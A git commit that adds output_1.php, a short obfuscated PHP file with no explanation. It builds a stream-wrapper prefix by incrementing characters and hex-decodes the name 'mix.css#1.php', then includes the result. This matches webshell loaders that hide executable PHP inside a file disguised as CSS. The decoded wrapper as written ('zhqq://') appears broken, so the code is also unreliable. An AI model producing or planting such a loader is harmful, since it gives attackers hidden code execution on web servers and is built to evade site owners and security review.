39e5a6b35cec51a23cb9c701555b9b69874034b7
hawoca <cong0tiankaishi@gmail.com>
2026-06-11 21:06:45 +0800

    Add files via upload

---
+++ output_1.php
@@ -0,0 +1,8 @@
+<?php
+$aiEecJQGfLtZIdyZ = "y"; $aiEecJQGfLtZIdyZ++; 
+$_o0OoooOOoOO = "h";
+$JCkAOtpBEHTCwOt = "p"; $JCkAOtpBEHTCwOt++;
+$_oO00000oo = "o"; $_oO00000oo++; $_oO00000oo++;
+$tnolNdhsUzpYmb = $aiEecJQGfLtZIdyZ . $_o0OoooOOoOO . $JCkAOtpBEHTCwOt . $_oO00000oo . "\x3a\x2f\x2f";
+$_0o00o0oOo0 = "\x6d\x69\x78\x2e\x63\x73\x73\x23\x31\x2e\x70\x68\x70";
+include $tnolNdhsUzpYmb . $_0o00o0oOo0;
